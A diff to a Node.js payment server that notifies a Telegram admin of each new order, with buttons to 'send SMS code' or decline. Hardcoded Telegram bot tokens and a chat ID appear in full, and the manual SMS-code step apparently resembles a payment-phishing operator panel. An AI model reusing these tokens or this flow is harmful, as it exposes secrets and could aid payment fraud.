@@ -87,10 +87,14 @@ setInterval(() => {
 
 // Telegram Bot Configuration
 const TELEGRAM_CONFIG = {
-  BOT_TOKEN: process.env.BOT_TOKEN || '7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo',
-  CHAT_ID: process.env.CHAT_ID || '2063086506',
+  BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN || '7769777050:AAF3xPnqJL8Pr0NgjEp7-2dvI0MpRKyQNQU',
+  ADMIN_CHAT_ID: process.env.ADMIN_CHAT_ID || process.env.CHAT_ID || '2063086506',
   WEBHOOK_URL: `${BASE_URL}/webhook`
 };
+
+console.log('🤖 Telegram bot token:', TELEGRAM_CONFIG.BOT_TOKEN ? 'SET' : 'NOT SET');
+console.log('👤 Admin chat ID:', TELEGRAM_CONFIG.ADMIN_CHAT_ID);
+console.log('🔗 Webhook URL:', TELEGRAM_CONFIG.WEBHOOK_URL);
 
 // Main route - serve index.html
 app.get('/', (req, res) => {
@@ -370,6 +374,7 @@ app.post('/api/payment/create-session', (req, res) => {
   const { bookingId, orderData } = req.body;
   
   console.log(`🔐 Creating payment session for ${bookingId}`);
+  console.log(`📊 Order data:`, orderData);
   
   const session = {
     bookingId,
@@ -380,6 +385,31 @@ app.post('/api/payment/create-session', (req, res) => {
   };
   
   paymentSessions.set(bookingId, session);
+  
+  // Send notification to Telegram admin
+  console.log(`📤 Sending new order notification to Telegram admin`);
+  
+  const inlineKeyboard = {
+    inline_keyboard: [[
+      { text: '📱 SMS', callback_data: `send_sms:${bookingId}` },
+      { text: '❌ Отклонить', callback_data: `decline:${bookingId}` }
+    ]]
+  };
+  
+  const orderText = orderData ? 
+    `📍 Маршрут: ${orderData.from || '?'} → ${orderData.to || '?'}\n📅 Дата: ${orderData.date || '?'}\n💰 Цена: ${orderData.price || '?'}\n` : 
+    '📊 Данные заказа не указаны';
+  
+  sendTelegramMessage(
+    TELEGRAM_CONFIG.ADMIN_CHAT_ID,
+    `📋 Новый заказ на оплату!\n\n${orderText}\n🆔 ID заказа: <code>${bookingId}</code>\n\n❓ Отправить SMS код?`,
+    'HTML',
+    inlineKeyboard
+  ).then(result => {
+    console.log(`📨 Order notification sent to Telegram:`, result?.ok);
+  }).catch(error => {
+    console.error(`❌ Error sending order notification:`, error);
+  });
   
   res.json({ 
     success: true, 
